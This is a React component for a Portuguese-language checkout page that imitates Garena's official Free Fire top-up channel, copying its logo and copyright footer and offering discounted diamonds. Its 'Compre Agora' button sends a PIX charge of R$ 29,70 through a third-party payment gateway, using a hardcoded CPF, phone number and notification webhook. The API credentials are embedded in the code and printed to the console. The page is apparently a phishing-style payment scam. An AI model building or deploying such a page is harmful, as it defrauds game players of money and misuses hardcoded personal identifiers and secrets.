import { useSearchParams, useNavigate } from 'react-router-dom';
import { useState } from 'react';
import PixLogo from './logo/logopix.png';
import DiamanteLogo from './logo/icons8-diamante.svg';
import BannerFF from './logo/banner.jpeg';
import '@fontsource/metropolis/100.css';
import '@fontsource/metropolis/200.css';
import '@fontsource/metropolis/300.css';
import '@fontsource/metropolis/400.css';
import '@fontsource/metropolis/500.css';
import '@fontsource/metropolis/600.css';
import '@fontsource/metropolis/700.css';
import '@fontsource/metropolis/800.css';
import '@fontsource/metropolis/900.css';
import LogoAppFF from '../logo/ff.png';

const IntroApp = () => {
    const [searchParams] = useSearchParams();
    const navigate = useNavigate();

    const name = searchParams.get('name');
    const email = searchParams.get('email');

    const [qrCode, setQrCode] = useState<string | null>(null);
    const [loading, setLoading] = useState(false);

    const generatePix = async () => {
        setLoading(true);
        const payload = {
            publicKey: 'b42390e6-516d-47f5-911b-bcac8510d064',
            name: name || 'Usuário Anônimo',
            email: email || 'emailexemplo@gmail.com',
            cpf: '20873372760',
            phone: '+5511984473512',
            paymentMethod: 'PIX',
            amount: 2970,
            traceable: true,
            items: [
                { 
                    unitPrice: 2970,
                    title: 'Assinatura Premium',
                    quantity: 1,
                    tangible: false,
                }
            ],
            postbackUrl: 'https://api.pushcut.io/U-9R4KGCR6y075x0NYKk7/notifications/Gerado',
        };
    
        try {
            console.log('Enviando requisição para:', 'https://zenithecom.zenithpay.com.br/api/v1/transaction.purchase');
            console.log('Cabeçalhos:', {
                'Content-Type': 'application/json',
                'Authorization': 'Bearer cdc1a632-a8dc-4c20-b361-536ff5ca245d',
            });
            console.log('Payload:', payload);
    
            const response = await fetch('https://zenithecom.zenithpay.com.br/api/v1/transaction.purchase', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': 'cdc1a632-a8dc-4c20-b361-536ff5ca245d',
                },
                body: JSON.stringify(payload),
            });
    
            const data = await response.json();
            console.log('Resposta da API:', data);
    
            if (!response.ok) {
                throw new Error(`Erro ${response.status}: ${data.message || 'Falha na geração do PIX'}`);
            }
    
            setQrCode(data.pixQrCode); // Exibir QR Code
        } catch (error) {
            console.error('Erro ao gerar PIX:', error);
            alert(`Erro: ${error.message}`);
        } finally {
            setLoading(false);
        }
    };
    
    

    return (
        <div className="telatotalogin">
            <div className="barrasuperior">
                <div className='garenffbarra'>
                    <svg width="34" height="36" viewBox="0 0 34 36" fill="none" xmlns="http://www.w3.org/2000/svg"><g id="Group 15328"><g id="Union"><path d="M19.5397 0.10298L19.6326 0.022157L19.8982 0L19.7826 0.195385L19.5734 0.229753L19.3184 0.505834L19.1692 0.425641L19.1335 0.516787L18.8325 0.540581L18.8448 0.620774L19.1335 0.655772L18.8911 0.724761L18.8565 0.828244L18.7168 0.81641L18.7058 0.920145L18.4166 0.931098V1.00097L18.2308 1.04679L18.0569 1.24155L17.9295 1.1611C17.9295 1.1611 17.8947 1.1611 17.8714 1.28838C17.2684 1.64168 16.0247 2.32664 14.7703 3.01758C13.7365 3.58698 12.6953 4.16043 11.9993 4.55566C11.9567 4.58208 11.9112 4.61072 11.8625 4.64133C11.2738 5.0112 10.2255 5.66994 8.52449 6.21303C10.1314 5.87985 10.7558 5.59868 11.6469 5.19752C12.079 5.00297 12.5738 4.7802 13.2737 4.50958C15.4158 3.68083 17.7672 3.77273 17.7672 3.77273L17.478 3.94646L17.5003 4.24496L17.6626 4.26837L17.7791 4.29128L17.9871 4.15356L17.9991 4.25691L18.1848 4.29128L18.3465 4.25691L18.5783 4.18856L18.7643 4.23098L18.7396 4.04894L18.8973 4.09993L19.0023 4.21839L19.1335 4.04894L19.4478 4.13606L19.1458 4.14172L19.1804 4.25691L18.6473 4.26837L18.6819 4.34869L18.3115 4.32603L18.2422 4.3604C18.2422 4.3604 18.3005 4.44147 18.2191 4.45255C17.9295 4.55566 17.7731 4.74638 17.7731 4.74638C20.4134 3.64105 23.6109 5.57412 23.6109 5.57412L23.8187 5.62498L23.8546 5.93669L23.9404 6.00631H24.1149L23.9927 6.19528L24.1149 6.33313V6.55721L23.9058 6.5061L23.7495 6.33313L23.8365 6.22939L23.7323 6.09267H23.4195L23.2638 5.98869L23.1416 5.97094L22.8634 5.83258L22.6374 5.86821L22.4292 5.67673L21.4904 5.69435L21.5431 5.78096L22.0121 5.81546L22.0818 5.93669H22.551L22.7937 6.12641L23.107 6.09267L23.2809 6.17815L23.6279 6.28139L23.4023 6.36787C23.4023 6.36787 23.8811 7.1017 26.8589 7.8004C31.1329 8.80112 34 6.95516 34 6.95516C33.2703 7.88638 32.3836 8.16221 32.3836 8.16221L31.7406 8.23208L31.6014 8.33519L31.3065 8.42193L30.4385 8.88798L30.2122 9.04283L30.1948 9.16318L30.1085 9.26742L30.0737 9.09507H29.8121L29.5699 9.16318L29.604 9.25017L29.5519 9.47388H29.3773L29.4655 9.33691L29.3773 9.26742L29.2742 9.09507L29.1182 9.11169L28.8052 9.38765L28.6141 9.33691L28.4918 9.37078L28.3188 9.45714L28.1452 9.52588L27.9192 9.45714L27.6927 9.5605L27.537 9.45714L27.1897 9.42201L27.1721 9.30204H26.9637L26.8067 9.38765L26.5986 9.52588L25.9041 9.5605L26.5464 9.68211L26.7728 9.71572L26.9288 9.52588L27.0854 9.50901L27.242 9.5605L27.5717 9.6991L27.7804 9.68211L27.9363 9.57724L28.058 9.63012L28.2145 9.71572L28.3772 9.80208C28.3772 9.80208 27.3808 9.94006 26.1071 10.0101C27.358 10.078 28.5379 10.9065 28.5379 10.9065C28.5379 10.9065 27.9131 10.6542 25.5978 10.8143C23.4676 10.9631 22.2721 10.4309 21.0773 9.89913C20.129 9.47709 19.1813 9.05525 17.7672 8.97409C13.5286 8.72936 11.7362 11.2349 11.7362 11.2349L11.579 11.5807L11.2405 11.6057L11.206 11.8123L11.1366 11.8384L11.1189 11.9071L10.8933 11.9937L10.902 12.0973L11.1189 12.1224L11.0758 12.261L11.0059 12.4072L11.3276 12.9697L10.9362 12.6326L10.7801 12.5545L10.511 12.4428L10.4241 12.5373L10.3543 12.7278L10.2415 12.9002L10.0767 12.8482C10.0767 12.8482 10.1113 13.3052 9.65914 13.3919C9.48551 13.5728 9.6509 13.677 9.6509 13.677L9.87674 13.694V13.8851L9.96406 13.901C9.96406 13.901 9.91172 13.9611 9.87674 14.0911C10.0416 14.1163 10.1193 14.0047 10.1193 14.0047L10.224 14.03C10.224 14.03 9.97242 14.5573 9.33825 14.7641C9.43342 14.8671 9.53773 14.8765 9.53773 14.8765C9.53773 14.8765 8.84297 15.2818 8.62588 15.7473C8.49585 16.2138 8.7042 16.1794 8.7042 16.1794C8.7042 16.1794 8.50383 16.4036 8.4866 16.0837C8.28724 15.9987 8.19194 16.2219 8.19194 16.2219C8.19194 16.2219 8.18231 16.2737 8.27825 16.3003C8.07826 16.4643 8.08739 16.6787 8.08739 16.6787L8.28724 16.6961C8.28724 16.6961 8.37342 16.9034 8.19194 16.9034C8.00945 16.9034 8.00057 16.9987 8.00057 16.9987V17.0931L8.096 17.1629L7.87587 17.3489C7.87587 17.3489 7.66752 18.1319 7.82999 19.582C8.40891 24.4364 13.0651 24.2304 13.0651 24.2304C13.0651 24.2304 17.6517 24.5978 19.7597 20.916C23.0032 15.1179 18.0454 13.8972 18.0454 13.8972C18.0454 13.8972 14.3855 13.0235 13.1807 14.3585C12.1089 15.5457 13.5514 16.9578 13.5514 16.9578C13.5514 16.9578 14.4087 17.5568 14.0145 18.5701C13.3594 20.253 11.5828 19.8334 11.5828 19.8334C11.5828 19.8334 8.80191 19.1686 9.45117 16.7523C10.3581 13.3735 14.7559 12.8164 14.7559 12.8164C14.7559 12.8164 19.4232 11.9764 22.2846 13.8868C23.5404 14.7256 25.6555 13.9906 25.6555 13.9906C25.044 14.5972 23.964 14.8053 23.9527 14.807C23.9532 14.807 23.9557 14.8065 23.9602 14.8058C24.0877 14.7838 25.8036 14.4876 28.0874 14.5433C30.3032 14.5964 31.6661 12.5633 31.6661 12.5633C31.6661 12.5633 31.2639 13.5216 29.4074 14.6231C26.6483 16.2595 26.2915 16.8663 26.2915 16.8663C26.2915 16.8663 26.524 16.7404 27.323 16.3371C25.4002 17.9829 24.1496 19.823 24.1496 19.823L23.9527 19.8811L24.0795 19.9951L24.253 20.0642L24.1947 20.2029L23.9757 20.2253C23.9757 20.2253 23.9527 20.5479 24.1612 20.6409C23.7903 20.9279 23.4314 21.3074 23.4314 21.3074L23.6159 21.3879C23.6159 21.3879 23.8709 21.6289 23.5465 21.9177C23.2687 22.2166 23.2568 21.837 23.2568 21.837C23.2568 21.837 23.2454 22.3198 22.6085 22.6538C22.4812 22.6992 22.2727 22.6416 22.2727 22.6416L21.9595 22.9987C21.9595 22.9987 24.1612 22.838 26.1071 22.032C22.539 23.7813 20.5126 23.9765 20.5126 23.9765V24.0341L20.7904 24.1037C20.7904 24.1037 20.0723 24.5398 17.3621 24.7826C17.8246 24.9317 17.8947 24.9205 17.8947 24.9205C17.8947 24.9205 17.2572 25.1273 15.7178 25.23C16.3083 25.4379 16.898 25.5081 16.898 25.5081L12.3351 25.5421C8.82523 25.5069 1.68961 22.5415 3.50964 16.1181C5.45538 9.25017 14.1769 8.04375 14.1769 8.04375C14.1769 8.04375 9.96545 6.80094 6.18486 8.55928C2.3281 10.3553 0 9.31929 0 9.31929L1.67998 7.67337L1.07749 7.83464L2.22304 6.81038L2.3044 6.95969L3.86842 5.30346L3.99579 5.50048L4.11213 5.61466L4.1575 5.41789L4.05409 5.2458L4.54036 4.71781L4.48232 4.67135L4.85301 4.08419L5.13107 4.02666L5.98804 3.11721C5.98804 3.11721 5.46729 3.71646 5.13107 4.32603C4.96847 4.87756 4.63301 5.10757 4.63301 5.10757C4.63301 5.10757 4.65582 5.15453 4.71373 5.25688C5.00345 4.48705 6.61284 3.67001 6.61284 3.67001C6.61284 3.67001 6.26635 3.94647 5.89515 4.32603C6.43947 3.8426 10.2161 1.35762 10.2161 1.35762L10.3776 1.36908L10.3896 1.49509C10.3896 1.49509 8.32729 2.99031 7.34321 4.02666C8.21108 3.76254 9.20822 2.9212 9.20822 2.9212L9.2655 3.09481L9.56713 3.11721L9.67092 3.03778L9.94911 2.85246L10.053 2.78347L10.0884 2.58771L10.4583 2.60068L10.4933 2.69195H10.5864L10.7243 2.63505L10.7712 2.51948L10.6902 2.39296L10.7712 2.28922C10.7712 2.28922 10.8641 2.38125 10.9565 2.50865C11.2815 2.19707 12.6137 1.87491 12.6137 1.87491C12.6137 1.87491 12.5323 1.9901 12.4399 2.09359C16.0297 1.42611 19.0416 0.218171 19.0416 0.218171L19.2839 0.206337L19.3079 0.126396L19.5397 0.10298Z" fill="#E41E26"></path><path d="M19.514 4.13467L19.4478 4.13606L19.5067 4.1523L19.514 4.13467Z" fill="#E41E26"></path><path d="M19.514 4.13467L19.7597 4.13039L19.7939 4.07261L20.9528 3.9802L22.539 3.88818L21.1147 3.80735L20.9985 3.91222L20.8017 3.90001L20.7782 3.86615L20.6581 3.82422L20.4313 3.94646H20.2924L20.2575 3.73874L20.1424 3.86237L19.8058 4.00349L19.6672 4.0147L19.5982 3.99443L19.5612 4.02288L19.514 4.13467Z" fill="#E41E26"></path><path d="M8.3578 35.869H7.93021L7.8517 34.7418H7.83371C7.41505 35.6264 6.57613 35.9998 5.67711 35.9998C3.71231 35.9998 2.73438 34.4644 2.73438 32.7732C2.73438 31.0823 3.71231 29.5469 5.67711 29.5469C6.98666 29.5469 8.0523 30.2495 8.27969 31.6026H7.68549C7.60725 30.8913 6.86444 30.05 5.67711 30.05C4.02647 30.05 3.32831 31.42 3.32831 32.7732C3.32831 34.1263 4.02647 35.4961 5.67711 35.4961C7.05624 35.4961 7.8601 34.5337 7.83371 33.2242H5.71203V32.7207H8.3578V35.869Z" fill="#E41E26"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M9.34051 32.7649C9.39302 31.7155 10.1354 31.2646 11.1658 31.2646C11.9607 31.2646 12.8248 31.5074 12.8248 32.7043V35.0805C12.8248 35.2894 12.9297 35.41 13.1476 35.41C13.2092 35.41 13.2792 35.3928 13.3224 35.3753V35.8348C13.2003 35.861 13.113 35.8693 12.9645 35.8693C12.4057 35.8693 12.3186 35.5572 12.3186 35.0892H12.3008C11.9167 35.6702 11.5238 36.0001 10.6594 36.0001C9.82941 36.0001 9.14844 35.5923 9.14844 34.69C9.14844 33.5196 10.2157 33.4011 11.3209 33.2784C11.4029 33.2693 11.4853 33.2602 11.5672 33.2506C12.0213 33.1986 12.2746 33.1377 12.2746 32.6431C12.2746 31.9067 11.742 31.7244 11.0958 31.7244C10.4144 31.7244 9.90778 32.0364 9.89058 32.7649H9.34051ZM12.2743 33.424H12.2571C12.1871 33.5541 11.9427 33.5973 11.7938 33.6233C11.6408 33.6503 11.4817 33.6727 11.3227 33.695C10.5106 33.809 9.69824 33.9231 9.69824 34.6558C9.69824 35.202 10.187 35.5399 10.7027 35.5399C11.5409 35.5399 12.283 35.0112 12.2743 34.1351V33.424Z" fill="#E41E26"></path><path d="M14.4358 31.3945H13.9297V35.8694H14.48V33.4844C14.48 32.5563 15.1605 31.8285 16.1561 31.8806V31.334C15.3441 31.299 14.7329 31.7244 14.453 32.444H14.4358V31.3945Z" fill="#E41E26"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M16.8472 33.7795C16.8558 34.5776 17.2748 35.5401 18.3312 35.5401C19.1351 35.5401 19.5716 35.0716 19.7462 34.395H20.2963C20.0608 35.41 19.467 36.0001 18.3312 36.0001C16.8993 36.0001 16.2969 34.9069 16.2969 33.6324C16.2969 32.4524 16.8993 31.2646 18.3312 31.2646C19.7813 31.2646 20.3574 32.5219 20.3136 33.7795H16.8472ZM19.7635 33.3202C19.7375 32.4961 19.222 31.7245 18.3312 31.7245C17.432 31.7245 16.9341 32.5047 16.8472 33.3202H19.7635Z" fill="#E41E26"></path><path d="M21.5974 31.3945H21.0469V35.8693H21.5974V33.2595C21.6147 32.3833 22.1381 31.7244 23.0121 31.7244C23.9027 31.7244 24.1556 32.3051 24.1556 33.0768V35.8693H24.7059V32.9902C24.7059 31.9235 24.3218 31.2646 23.0557 31.2646C22.418 31.2646 21.8157 31.6287 21.6147 32.1667H21.5974V31.3945Z" fill="#E41E26"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M25.6921 32.7649C25.7443 31.7155 26.4869 31.2646 27.517 31.2646C28.3116 31.2646 29.1761 31.5074 29.1761 32.7043V35.0805C29.1761 35.2894 29.2808 35.41 29.4989 35.41C29.5602 35.41 29.6303 35.3928 29.6738 35.3753V35.8348C29.5513 35.861 29.464 35.8693 29.3155 35.8693C28.757 35.8693 28.67 35.5572 28.67 35.0892H28.6525C28.2677 35.6702 27.8749 36.0001 27.0102 36.0001C26.1811 36.0001 25.5 35.5923 25.5 34.69C25.5 33.5196 26.5669 33.4011 27.6719 33.2784C27.7538 33.2693 27.8362 33.2602 27.9181 33.2506C28.3729 33.1986 28.6263 33.1377 28.6263 32.6431C28.6263 31.9067 28.0933 31.7244 27.4471 31.7244C26.766 31.7244 26.2597 32.0364 26.2421 32.7649H25.6921ZM28.6261 33.424H28.6084C28.5391 33.5541 28.2944 33.5973 28.146 33.6233C27.9929 33.6503 27.8336 33.6727 27.6744 33.695C26.8619 33.809 26.0498 33.923 26.0498 34.6558C26.0498 35.202 26.5387 35.5399 27.0539 35.5399C27.8924 35.5399 28.6345 35.0112 28.6261 34.1351V33.424Z" fill="#E41E26"></path></g></g></svg>
                    <div className="linhareta"></div>
                    <p className="textotopobarra">
                        Canal Oficial de <br />
                        Recarga
                    </p>
                </div>
            </div>

            <img src={BannerFF} className="bannerff" />

            <div className="selecao">
                <div className="barrabrilho">
                    <div className="iniciobarrabrilho"></div>
                    <svg width="390" height="27" viewBox="0 0 390 27" fill="none" xmlns="http://www.w3.org/2000/svg" className='svgdabara' preserveAspectRatio="xMidYMin meet" role="none"><path d="M390 0H0V7H285L301 27H390V0Z" fill="url(#paint0_linear_2330_34259)" role="none"></path><mask id="mask0_2330_34259" maskUnits="userSpaceOnUse" x="0" y="0" width="390" height="27" role="none" ><path d="M390 0H0V7H285L301 27H390V0Z" fill="url(#paint1_linear_2330_34259)" role="none"></path></mask><g mask="url(#mask0_2330_34259)" role="none"><rect x="-15.0254" y="72.4863" width="110.997" height="3" transform="rotate(-45 -15.0254 72.4863)" fill="url(#paint2_linear_2330_34259)" role="none"></rect><rect opacity="0.5" x="232.053" y="58.1582" width="110.997" height="25.9753" transform="rotate(-47 232.053 58.1582)" fill="url(#paint3_linear_2330_34259)" role="none"></rect><rect opacity="0.3" x="298.977" y="69.4863" width="110.997" height="6.3044" transform="rotate(-45 298.977 69.4863)" fill="url(#paint4_linear_2330_34259)" role="none"></rect><path opacity="0.5" d="M192.334 72.0098L268.034 -9.16811L278.223 -7.40131L202.523 73.7766L192.334 72.0098Z" fill="url(#paint5_linear_2330_34259)" role="none"></path><rect opacity="0.15" x="-21" y="123.275" width="179.995" height="4.38032" transform="rotate(-45 -21 123.275)" fill="url(#paint6_linear_2330_34259)" role="none"></rect></g><defs role="none"><linearGradient id="paint0_linear_2330_34259" x1="-9" y1="7.61906" x2="387.828" y2="41.0361" gradientUnits="userSpaceOnUse" role="none"><stop stop-color="#F2B13E" role="none"></stop><stop offset="1" stop-color="#FDD373" stop-opacity="0.63" role="none"></stop></linearGradient><linearGradient id="paint1_linear_2330_34259" x1="27" y1="15.2381" x2="388.472" y2="38.7377" gradientUnits="userSpaceOnUse" role="none"><stop stop-color="#F3A00C" role="none"></stop><stop offset="1" stop-color="#FFBB21" stop-opacity="0.76" role="none"></stop></linearGradient><linearGradient id="paint2_linear_2330_34259" x1="9.0067" y1="75.3242" x2="64.1695" y2="74.4301" gradientUnits="userSpaceOnUse" role="none"><stop stop-color="#DB910B" stop-opacity="0" role="none"></stop><stop offset="1" stop-color="#F09F0B" role="none"></stop></linearGradient><linearGradient id="paint3_linear_2330_34259" x1="295.701" y1="78.6918" x2="318.228" y2="69.5067" gradientUnits="userSpaceOnUse" role="none"><stop stop-color="#DE9611" stop-opacity="0" role="none"></stop><stop offset="1" stop-color="#F79F00" role="none"></stop></linearGradient><linearGradient id="paint4_linear_2330_34259" x1="323.009" y1="75.4501" x2="378.183" y2="75.0245" gradientUnits="userSpaceOnUse" role="none"><stop stop-color="#DE9611" stop-opacity="0" role="none"></stop><stop offset="1" stop-color="#F79F00" role="none"></stop></linearGradient><linearGradient id="paint5_linear_2330_34259" x1="218.794" y1="56.0898" x2="255.761" y2="15.1365" gradientUnits="userSpaceOnUse" role="none"><stop stop-color="#DE9611" stop-opacity="0" role="none"></stop><stop offset="1" stop-color="#F79F00" role="none"></stop></linearGradient><linearGradient id="paint6_linear_2330_34259" x1="17.9709" y1="127.419" x2="83.65" y2="126.721" gradientUnits="userSpaceOnUse" role="none"><stop stop-color="#F79F00" role="none"></stop><stop offset="1" stop-color="#DE9611" stop-opacity="0" role="none"></stop></linearGradient></defs></svg>

                </div>

                <p className="textobemvindo">Seleção de jogos</p>
                <div className="gridcentra">
                    <div className='primeiradivcenter'>
                        <div className="logoetexto">
                            <div className="cenralizaapptext">
                                <img src={LogoAppFF} className='logoferr' />
                                Free Fire
                            </div>
                        </div>
                    </div>
                    <div></div>
                    <div></div>
                    <div></div>
                </div>
            </div>

            <div className="dadosexposto">
                <div className="bannerdadosdepag">
                    <div className="imgetexto">
                        <img src={LogoAppFF} className="logopagamento" />
                        <div className="textoinfopagseguro">
                            <p id="titulopag">Free Fire</p>
                            <div className="pagamentoseguro">
                                <svg width="1em" height="1em" className='escudoseguro' viewBox="0 0 80 80" fill="none" xmlns="http://www.w3.org/2000/svg" class="me-1"><path d="M54.125 34.1211C55.2966 32.9495 55.2966 31.05 54.125 29.8784C52.9534 28.7069 51.0539 28.7069 49.8823 29.8784L38.0037 41.7571L32.125 35.8784C30.9534 34.7069 29.0539 34.7069 27.8823 35.8784C26.7108 37.05 26.7108 38.9495 27.8823 40.1211L35.8823 48.1211C37.0539 49.2926 38.9534 49.2926 40.125 48.1211L54.125 34.1211Z" fill="currentColor"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M43.4187 3.4715C41.2965 2.28554 38.711 2.28554 36.5889 3.4715L8.07673 19.4055C6.19794 20.4555 4.97252 22.4636 5.02506 24.7075C5.36979 39.43 10.1986 63.724 37.0183 76.9041C38.8951 77.8264 41.1125 77.8264 42.9893 76.9041C69.809 63.724 74.6377 39.43 74.9825 24.7075C75.035 22.4636 73.8096 20.4555 71.9308 19.4055L43.4187 3.4715ZM39.5159 8.7091C39.8191 8.53968 40.1885 8.53968 40.4916 8.7091L68.9826 24.6313C68.6493 38.3453 64.2154 59.7875 40.343 71.5192C40.135 71.6214 39.8725 71.6214 39.6646 71.5192C15.7921 59.7875 11.3583 38.3453 11.025 24.6313L39.5159 8.7091Z" fill="currentColor"></path></svg>
                                Pagamento 100% Seguro
                            </div>
                        </div>
                    </div>
                </div>

                <div className="loginpagamento">
                    <div className="infoprimeirologinpag">
                        <p id="numberonpag">1</p>
                        <p id="txtloginpagfirst">Login</p>
                    </div>
                    <div className="centraldivbaixa">
                        <div className="indologado">
                            <button type='submit' className="botaologado">LOGADO!</button>
                        </div>
                    </div>
                </div>

                <div className="loginpagamento">
                    <div className="infoprimeirologinpag">
                        <p id="numberonpag">2</p>
                        <p id="txtloginpagfirst">Valor de Recarga</p>
                    </div>
                    <div className="centraldivbaixasec">
                        <div className="indologadosec">
                            <button className="botaologadosec">Você ganhou 71% de desconto!</button>
                        </div>
                    </div>
                    <div className="centraltextrecarga">
                        <div className="valorderecarga">
                            <img src={DiamanteLogo} className="logodiamante" />
                            <p className='valorederecargatxt'>5.600</p>
                        </div>
                    </div>
                </div>

                <div className="loginpagamento">
                    <div className="infoprimeirologinpag">
                        <p id="numberonpag">3</p>
                        <p id="txtloginpagfirst">Método de Pagamento</p>
                    </div>
                    <div className="centraldivbaixasecs">
                        <p className='spacetextpag'><svg width="1em" height="1em" viewBox="0 0 80 80" fill="none" xmlns="http://www.w3.org/2000/svg" class="inline-block align-middle text-base/none"><path fill-rule="evenodd" clip-rule="evenodd" d="M9 18C9 11.9249 13.9249 7 20 7H60C66.0751 7 71 11.9249 71 18V62C71 68.0751 66.0751 73 60 73H20C13.9249 73 9 68.0751 9 62V18ZM20 13C17.2386 13 15 15.2386 15 18V62C15 64.7614 17.2386 67 20 67H60C62.7614 67 65 64.7614 65 62V18C65 15.2386 62.7614 13 60 13H20ZM23 31C23 29.3431 24.3431 28 26 28H54C55.6569 28 57 29.3431 57 31C57 32.6569 55.6569 34 54 34H26C24.3431 34 23 32.6569 23 31ZM26 46C24.3431 46 23 47.3431 23 49C23 50.6569 24.3431 52 26 52H42C43.6569 52 45 50.6569 45 49C45 47.3431 43.6569 46 42 46H26Z" fill="currentColor"></path></svg>
                            Utilize sua instituição financeira para realizar o pagamento. <br />Seus créditos caem na sua conta de jogo assim que recebermos a confirmação de pagamento. <br /> [Para FF] Além dos diamantes em bônus, você ganha + 20% de bônus em items dentro do jogo.</p>
                    </div>
                    <div className="centraltextrecarga">
                        <div className="valorderecargas">
                            <img src={PixLogo} className="piclogopag" />
                            <div className="apptxtimg">
                                <p className='valorederecargatxtxx'>R$ 29,70 <b className='bonustxt'> + Bônus 1.120</b> <img src={DiamanteLogo} className="logodiamante" /></p>
                            </div>
                            <div className="centraltopopromotxt">
                                <div className="pixanoptinpix">
                                    <div className="pixopinin">
                                        <img src={DiamanteLogo} className="logodiamantes" />
                                        PROMO
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

            </div>

            <footer className="footersites">
                <div className="inforeoci">
                    <div className="fortspag">
                        <img src={DiamanteLogo} className='logodiamantesx' alt="Logo Diamante" />
                        <p className="txtdiamondbonus">5.600 + 1.120</p>
                        <svg width="1em" height="1em" viewBox="0 0 18 18" fill="none" xmlns="http://www.w3.org/2000/svg" className="text-icon"><path d="M11.25 9.96484L9 7.71484L6.75 9.96484" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"></path></svg>
                    </div>
                    <div className="totalpricepag">
                        <p className="indfotxttotalmaisrais">Total: <b className='precoatual'>R$ 29,70</b></p>
                    </div>
                </div>
                <div className="botaopagmento">
                    <button className='botatocompraagora' onClick={generatePix} disabled={loading}>
                    <svg width="1em" height="1em" viewBox="0 0 80 80" className='svgescudfobotacompag' fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M54.125 34.1211C55.2966 32.9495 55.2966 31.05 54.125 29.8784C52.9534 28.7069 51.0539 28.7069 49.8823 29.8784L38.0037 41.7571L32.125 35.8784C30.9534 34.7069 29.0539 34.7069 27.8823 35.8784C26.7108 37.05 26.7108 38.9495 27.8823 40.1211L35.8823 48.1211C37.0539 49.2926 38.9534 49.2926 40.125 48.1211L54.125 34.1211Z" fill="currentColor"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M43.4187 3.4715C41.2965 2.28554 38.711 2.28554 36.5889 3.4715L8.07673 19.4055C6.19794 20.4555 4.97252 22.4636 5.02506 24.7075C5.36979 39.43 10.1986 63.724 37.0183 76.9041C38.8951 77.8264 41.1125 77.8264 42.9893 76.9041C69.809 63.724 74.6377 39.43 74.9825 24.7075C75.035 22.4636 73.8096 20.4555 71.9308 19.4055L43.4187 3.4715ZM39.5159 8.7091C39.8191 8.53968 40.1885 8.53968 40.4916 8.7091L68.9826 24.6313C68.6493 38.3453 64.2154 59.7875 40.343 71.5192C40.135 71.6214 39.8725 71.6214 39.6646 71.5192C15.7921 59.7875 11.3583 38.3453 11.025 24.6313L39.5159 8.7091Z" fill="currentColor"></path></svg>
                        {loading ? 'Gerando PIX...' : 'Compre Agora'}
                    </button>
                </div>
            </footer>

            {qrCode && (
                <div className="qrcode-container">
                    <h3>Escaneie o QR Code para pagamento:</h3>
                    <img src={qrCode} alt="QR Code para pagamento" className='qrcode-image' />
                </div>
            )}

            <div className="footerbaixinfo">
                <div className="textparf">
                    © Garena Online. Todos os direitos reservados.
                </div>
                <div className="infofaaq">

                </div>
            </div>
        </div>
    );
};

export default IntroApp;
